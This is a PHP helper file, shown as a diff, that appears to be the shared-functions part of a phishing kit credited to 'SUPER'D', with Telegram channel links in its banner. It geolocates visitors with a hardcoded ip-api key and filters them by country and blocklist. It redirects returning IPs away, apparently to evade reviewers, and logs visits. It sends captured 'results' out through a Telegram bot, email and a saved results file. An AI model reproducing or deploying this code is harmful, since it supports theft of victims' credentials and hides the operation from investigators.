@@ -1,0 +1,562 @@
+<?php
+//session_start();
+/*
+  █████████  █████  █████ ███████████  ██████████ ███████████    ██ ██████████  
+ ███░░░░░███░░███  ░░███ ░░███░░░░░███░░███░░░░░█░░███░░░░░███  ███░░███░░░░███ 
+░███    ░░░  ░███   ░███  ░███    ░███ ░███  █ ░  ░███    ░███ ░░░  ░███   ░░███
+░░█████████  ░███   ░███  ░██████████  ░██████    ░██████████       ░███    ░███
+ ░░░░░░░░███ ░███   ░███  ░███░░░░░░   ░███░░█    ░███░░░░░███      ░███    ░███
+ ███    ░███ ░███   ░███  ░███         ░███ ░   █ ░███    ░███      ░███    ███ 
+░░█████████  ░░████████   █████        ██████████ █████   █████     ██████████  
+ ░░░░░░░░░    ░░░░░░░░   ░░░░░        ░░░░░░░░░░ ░░░░░   ░░░░░     ░░░░░░░░░░   
+                                                                                
+                                                                                
+                                                                            
+2025 
+
+t.me/dj0ui
+t.me/superdzone
+t.me/superdsp
+*/
+require_once 'config.php';
+class Mobile_Detect {
+
+    protected $accept;
+    protected $userAgent;
+
+    protected $isMobile     = false;
+    protected $isAndroid    = null;
+    protected $isBlackberry = null;
+    protected $isIphone     = null;
+    protected $isIpad       = null;
+    protected $isOpera      = null;
+    protected $isPalm       = null;
+    protected $isWindows    = null;
+    protected $isGeneric    = null;
+
+    protected $devices = array(
+        "android"       => "android",
+        "blackberry"    => "blackberry",
+        "iphone"        => "(iphone|ipod)",
+        "ipad"          => "ipad",
+        "opera"         => "opera mini",
+        "palm"          => "(avantgo|blazer|elaine|hiptop|palm|plucker|xiino)",
+        "windows"       => "windows ce; (iemobile|ppc|smartphone)",
+        "generic"       => "(kindle|mobile|mmp|midp|o2|pda|pocket|psp|symbian|smartphone|treo|up.browser|up.link|vodafone|wap)"
+    );
+
+    public function __construct() {
+        $this->userAgent = isset( $_SERVER['HTTP_USER_AGENT'] ) ? $_SERVER['HTTP_USER_AGENT'] : '';
+        $this->accept    = isset( $_SERVER['HTTP_ACCEPT'] ) ? $_SERVER['HTTP_ACCEPT'] : '';
+
+        if (isset($_SERVER['HTTP_X_WAP_PROFILE'])|| isset($_SERVER['HTTP_PROFILE'])) {
+            $this->isMobile = true;
+        } elseif (strpos($this->accept,'text/vnd.wap.wml') > 0 || strpos($this->accept,'application/vnd.wap.xhtml+xml') > 0) {
+            $this->isMobile = true;
+        } else {
+            foreach ($this->devices as $device => $regexp) {
+                if ($this->isDevice($device)) {
+                    $this->isMobile = true;
+                }
+            }
+        }
+    }
+
+
+    /**
+     * Overloads isAndroid() | isBlackberry() | isOpera() | isPalm() | isWindows() | isGeneric() through isDevice()
+     *
+     * @param string $name
+     * @param array $arguments
+     * @return bool
+     */
+    public function __call($name, $arguments) {
+        $device = strtolower(substr($name, 2));
+        if ($name == "is" . ucfirst($device)) {
+            return $this->isDevice($device);
+        } else {
+            trigger_error("Method $name not defined", E_USER_ERROR);
+        }
+    }
+
+
+    /**
+     * Returns true if any type of mobile device detected, including special ones
+     * @return bool
+     */
+    public function isMobile() {
+        return $this->isMobile;
+    }
+
+    protected function isDevice($device) {
+        $var    = "is" . ucfirst($device);
+        $return = $this->$var === null ? (bool) preg_match("/" . $this->devices[$device] . "/i", $this->userAgent) : $this->$var;
+
+        if ($device != 'generic' && $return == true) {
+            $this->isGeneric = false;
+        }
+
+        return $return;
+    }
+}
+
+	function getIp() {
+	    foreach (array('HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','HTTP_X_FORWARDED','HTTP_X_CLUSTER_CLIENT_IP','HTTP_FORWARDED_FOR','HTTP_FORWARDED','REMOTE_ADDR') as $key)
+	   	{
+	       if (array_key_exists($key, $_SERVER) === true)
+	       {
+	            foreach (explode(',', $_SERVER[$key]) as $IPaddress){
+	                $IPaddress = trim($IPaddress);
+	                if (filter_var($IPaddress,FILTER_VALIDATE_IP,FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)!== false) 
+	                {
+	                   return $IPaddress;
+	                }
+	            }
+	        }
+	    }
+	}
+
+
+	function clientData($ss) {
+
+		$ip_infos = file_get_contents("https://pro.ip-api.com/php/". getIp() ."?key=UO8wl6MQD2zPxmf&fields=status,message,country,countryCode,region,regionName,city,timezone,currency,isp,mobile,proxy,hosting,query");
+		$ip_infos = unserialize($ip_infos);
+		
+		if (!isset($ip_infos['status']) || $ip_infos['status'] != 'success') {
+			return "127.0.0.1";
+		}
+		
+		switch ($ss) {
+			case "code":
+				$str = $ip_infos['countryCode'];
+				break;
+			case "country":
+				$str = $ip_infos['country'];
+				break;
+			case "city":
+				$str = $ip_infos['city'];
+				break;
+			case "state":
+				$str = $ip_infos['regionName'];
+				break;
+			case "timezone":
+				$str = $ip_infos['timezone'];
+				break;
+			case "currency":
+				$str = $ip_infos['currency'];
+				break;
+			case "isp":
+				$str = $ip_infos['isp'];
+				break;
+			case "mobile":
+				$str = $ip_infos['mobile'];
+				break;
+			case "proxy":
+				$str = $ip_infos['proxy'];
+				break;
+			case "hosting":
+				$str = $ip_infos['hosting'];
+				break;
+			default:
+				$str = $ip_infos['query']; 
+		}
+		
+		return $str;
+	}
+
+	function getOs() {
+    $os_platform = "Unknown OS";
+    $userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+    
+    if (empty($userAgent)) {
+        return $os_platform;
+    }
+    
+    $all = array(
+        '/windows nt 10/i'     => 'Windows 10',
+        '/windows nt 6.3/i'    => 'Windows 8.1',
+        '/windows nt 6.2/i'    => 'Windows 8',
+        '/windows nt 6.1/i'    => 'Windows 7',
+        '/windows nt 6.0/i'    => 'Windows Vista',
+        '/windows nt 5.2/i'    => 'Windows Server 2003/XP x64',
+        '/windows nt 5.1/i'    => 'Windows XP',
+        '/windows xp/i'        => 'Windows XP',
+        '/windows nt 5.0/i'    => 'Windows 2000',
+        '/windows me/i'        => 'Windows ME',
+        '/win98/i'             => 'Windows 98',
+        '/win95/i'             => 'Windows 95',
+        '/win16/i'             => 'Windows 3.11',
+        '/macintosh|mac os x/i' => 'Mac OS X',
+        '/mac_powerpc/i'       => 'Mac OS 9',
+        '/linux/i'             => 'Linux',
+        '/ubuntu/i'            => 'Ubuntu',
+        '/iphone/i'            => 'iPhone',
+        '/ipod/i'              => 'iPod',
+        '/ipad/i'              => 'iPad',
+        '/android/i'           => 'Android',
+        '/blackberry/i'        => 'BlackBerry',
+        '/webos/i'             => 'Mobile'
+    );
+    
+    foreach ($all as $regex => $value) { 
+        if (preg_match($regex, $userAgent)) {
+            $os_platform = $value;
+        }
+    }   
+    
+    return $os_platform;
+}
+
+	function getBrowser() {
+    $browser = "Unknown Browser";
+    $userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+    
+    if (empty($userAgent)) {
+        return $browser;
+    }
+    
+    $all = array(
+        '/msie/i'       => 'Internet Explorer',
+        '/firefox/i'    => 'Firefox',
+        '/safari/i'     => 'Safari',
+        '/chrome/i'     => 'Chrome',
+        '/edge/i'       => 'Edge',
+        '/opera/i'      => 'Opera',
+        '/netscape/i'   => 'Netscape',
+        '/maxthon/i'    => 'Maxthon',
+        '/konqueror/i'  => 'Konqueror',
+        '/mobile/i'     => 'Handheld Browser'
+    );
+    
+    foreach ($all as $regex => $value) { 
+        if (preg_match($regex, $userAgent)) {
+            $browser = $value;
+        }
+    }
+    
+    return $browser;
+}
+	
+	$ip              = getIp();
+
+    function isIpAllowed($ip) {
+    $config = getConfig();
+    
+    // Check blocked IPs
+    if (isset($config['blocked_ips']) && !empty($config['blocked_ips'])) {
+        $blockedIps = explode(',', $config['blocked_ips']);
+        $blockedIps = array_map('trim', $blockedIps);
+        $blockedIps = array_filter($blockedIps);
+        
+        if (in_array($ip, $blockedIps)) {
+            return false;
+        }
+    }
+    
+    // Check allowed countries
+    if (isset($config['allowed_countries']) && $config['allowed_countries'] !== 'ALL') {
+        $allowedCountries = explode(',', $config['allowed_countries']);
+        $allowedCountries = array_map('trim', $allowedCountries);
+        $visitorCountry = clientData('code');
+        
+        if (!in_array($visitorCountry, $allowedCountries)) {
+            return false;
+        }
+    }
+    
+    return true;
+}
+	function gurl($length = 124) {
+		$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+		$charactersLength = strlen($characters);
+		$randomString = '';
+		for ($i = 0; $i < $length; $i++) {
+			$randomString .= $characters[rand(0, $charactersLength - 1)];
+		}
+		return $randomString;
+	}
+	
+	
+	function getSiteName() {
+		$config = getConfig();
+		return $config['site_name'] ?? SITE_NAME;
+	}
+
+	function sitexite() {
+		$config = getConfig();
+		return $config['site_exit'] ?? SITE_NAME;
+	}
+	
+$_SESSION['os']=getOs();
+$_SESSION['browser']=getBrowser();
+$_SESSION['countryCode']=clientData('code');
+
+	function visitors() {
+        //$useragent       = $_SERVER['HTTP_USER_AGENT'];
+        $ip              = $_SERVER['REMOTE_ADDR'] ?? 'unknown_ip';
+        $date            = date("Y-m-d H:i:s", time());
+        $os_name         = getOs();
+        $browser_name    = getBrowser();
+        $country         = clientData('country');
+
+        $hits = '<tr><td width="80"><p>'.$ip.'</th><td width="80"><p>'.$browser_name.'</th><td width="80"><p>'.$os_name.'</th><td width="80"><p >'.$country.'</th><td width="80"><p>'.$date.'</th></th></tr>';
+        file_put_contents('data/'.getsitename().'.html', $hits  , FILE_APPEND | LOCK_EX);
+    }
+	
+
+
+function setVisitToken() {
+    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown_ip';
+    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown_agent';
+    $token = base64_encode($userAgent . $ip . time());
+    $_SESSION['whitelist'] = $token;
+    return $token;
+}
+
+
+function validateVisit() {
+    if(!isset($_SESSION['whitelist'])) {
+        header("Location: ../index.php");
+        exit();
+    }
+    return true;
+}
+
+
+
+function oat() {
+    $filePath = 'data/oat.txt';
+    
+    if (!is_dir('data')) {
+        mkdir('data', 0755, true);
+    }
+    
+    $clientIP = $_SERVER['REMOTE_ADDR']; 
+    
+    if (!file_exists($filePath)) {
+        file_put_contents($filePath, ''); 
+    }
+    
+    $ips = file($filePath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+
+	if (is_array($ips) && in_array($clientIP, $ips)) {
+        header("Location: " . sitexite()); 
+        exit; 
+    }
+
+    if (!empty($clientIP)) {
+        file_put_contents($filePath, $clientIP . PHP_EOL, FILE_APPEND | LOCK_EX);
+    }
+    return false; 
+}
+
+
+function getVisitorsFromHtml() {
+    $htmlFile = DATA_DIR . getSiteName() . '.html';
+    
+    if (!file_exists($htmlFile) || filesize($htmlFile) === 0) {
+        return [];
+    }
+    
+    $content = file_get_contents($htmlFile);
+    $visitors = [];
+    
+    if (strpos($content, '<table>') === false) {
+        $content = '<table>' . $content . '</table>';
+    }
+    
+ 
+    $rowPatterns = [
+        '/<tr>(.*?)<\/tr>/si',                
+        '/<tr[^>]*>(.*?)<\/tr>/si',             
+        '/<tr>[\s\n\r]*(.*?)[\s\n\r]*<\/tr>/si' 
+    ];
+    
+    $rows = [];
+    foreach ($rowPatterns as $pattern) {
+        preg_match_all($pattern, $content, $matches);
+        if (!empty($matches[1])) {
+            $rows = $matches[1];
+            break;
+        }
+    }
+    
+    if (empty($rows)) {
+        $rows = explode('<tr>', $content);
+        array_shift($rows); 
+
+        foreach ($rows as &$row) {
+            $row = str_replace('</tr>', '', $row);
+        }
+    }
+    
+
+    echo "<!-- Found " . count($rows) . " rows -->";
+    
+    foreach ($rows as $row) {
+     
+        $cellPatterns = [
+            '/<td[^>]*><p[^>]*>(.*?)<\/p><\/td>/si',  
+            '/<td[^>]*>(.*?)<\/td>/si',               
+            '/<th[^>]*>(.*?)<\/th>/si'               
+        ];
+        
+        $cells = [];
+        foreach ($cellPatterns as $pattern) {
+            preg_match_all($pattern, $row, $matches);
+            if (!empty($matches[1]) && count($matches[1]) >= 3) {
+                $cells = $matches[1];
+                break;
+            }
+        }
+        
+      
+        if (empty($cells)) {
+            $tdParts = explode('<td', $row);
+            array_shift($tdParts); 
+            
+            foreach ($tdParts as $tdPart) {
+                $endPos = strpos($tdPart, '</td>');
+                if ($endPos !== false) {
+                    $cellContent = substr($tdPart, strpos($tdPart, '>') + 1, $endPos - strpos($tdPart, '>') - 1);
+                    $cellContent = strip_tags($cellContent);
+                    $cells[] = trim($cellContent);
+                }
+            }
+        }
+        
+       
+        if (count($cells) >= 4) {
+            $visitors[] = [
+                'ip' => $cells[0] ?? 'Unknown',
+                'browser' => $cells[1] ?? 'Unknown',
+                'os' => $cells[2] ?? 'Unknown',
+                'country' => $cells[3] ?? 'Unknown',
+                'date' => $cells[4] ?? date('Y-m-d H:i:s')
+            ];
+        }
+    }
+    
+  
+    echo "<!-- Parsed " . count($visitors) . " visitors -->";
+    
+    return array_reverse($visitors);
+}
+
+function tok() {
+    $config = getConfig();
+    return $config['token'] ?? TOKEN;
+}
+
+function chat() {
+    $config = getConfig();
+    return $config['chatid'] ?? CHATID;
+}
+
+
+$botToken =tok();
+$chatId =chat();
+
+function sendtg($botToken, $chatId, $msg, $additionalParams = []) {
+    $website = "https://api.telegram.org/bot" . $botToken;
+    $params = [
+        'chat_id' => $chatId,
+        'text' => $msg,
+        'parse_mode' => 'HTML',
+    ];
+
+    // Merge additional parameters if provided
+    if (!empty($additionalParams) && is_array($additionalParams)) {
+        $params = array_merge($params, $additionalParams);
+    }
+
+    $ch = curl_init($website . '/sendMessage');
+    curl_setopt($ch, CURLOPT_HEADER, false);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params)); // Added http_build_query
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 30); // Added timeout
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10); // Added connection timeout
+    
+    $result = curl_exec($ch);
+    
+    // Error handling
+    if (curl_errno($ch)) {
+        $error = curl_error($ch);
+        curl_close($ch);
+        return ['error' => $error];
+    }
+    
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    
+    // Return decoded JSON response
+    $response = json_decode($result, true);
+    
+    // Add HTTP status to response for debugging
+    if (is_array($response)) {
+        $response['http_code'] = $httpCode;
+    }
+    
+    return $response;
+}
+
+function eml() {
+    $config = getConfig();
+    return $config['email'] ?? EMAIL;
+}
+
+$email =eml();
+function sendemail($email, $msg, $subject = "⚠️ New result ⚠️", $fromName = "♛ SUPER'D ♛") {
+    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
+        return false;
+    }
+
+    $headers = 'From: ' . $fromName . "\r\n";
+    $headers .= 'Reply-To: ' . $fromName . "\r\n";
+    $headers .= 'MIME-Version: 1.0' . "\r\n";
+    $headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
+    
+
+    return mail($email, $subject, $msg, $headers);
+}
+
+
+function savetxt($msg, $siteName = '') {
+
+    if (empty($siteName)) {
+        $siteName = getSiteName();
+    }
+    
+    $filePath = '../data/res' . $siteName . '.html';
+
+    $dirPath = dirname($filePath);
+    if (!is_dir($dirPath)) {
+        mkdir($dirPath, 0755, true);
+    }
+  
+    $formattedMsg = "{$msg}" . PHP_EOL;
+
+    return file_put_contents($filePath, $formattedMsg, FILE_APPEND);
+}
+
+function emlez() {
+    $config = getConfig();
+    return $config['emailres'] ?? EMAILRES;
+}
+
+
+function txt() {
+    $config = getConfig();
+    return $config['txt'] ?? TXT;
+}
+
+function snd() {
+    $config = getConfig();
+    return $config['sound_notification_enabled'] ? 'true' : 'false';
+}
+
+
+
+?>
